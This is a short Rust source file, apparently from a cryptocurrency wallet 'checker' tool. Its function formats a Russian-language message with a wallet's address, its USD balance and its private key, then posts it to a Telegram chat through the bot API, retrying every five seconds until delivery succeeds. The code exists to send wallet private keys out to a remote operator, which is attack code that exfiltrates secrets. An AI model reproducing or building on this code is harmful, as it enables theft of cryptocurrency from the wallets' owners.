use crate::blockchain::Blockchain;
use crate::{db, CONFIG};
use ethers::prelude::U256;
use reqwest::StatusCode;
use std::collections::HashMap;
use std::time::Duration;

pub async fn send_msg(
    api: Option<String>,
    user_id: String,
    wallet: db::Model,
    sum: f64,
) -> anyhow::Result<()> {
    let text = format!(
        "На адресе: {} баланс {} usd. \n Приват кей: {}",
        wallet.address,
        sum.to_string(),
        wallet.private_key
    );

    let api = match api {
        None => (&*CONFIG.checker_telegram_bot).to_string(),
        Some(v) => v,
    };

    let client = reqwest::Client::new();
    let mut body = HashMap::with_capacity(4);
    body.insert("text", text.clone());
    body.insert("chat_id", user_id.clone());
    body.insert("parse_mode", "Markdown".to_string());

    loop {
        let resp = client
            .post(format!("https://api.telegram.org/bot{}/sendMessage", api))
            .json(&body)
            .send()
            .await?;

        if resp.status() == StatusCode::OK {
            return Ok(());
        } else {
            tokio::time::sleep(Duration::from_secs(5)).await;
        }
    }
}
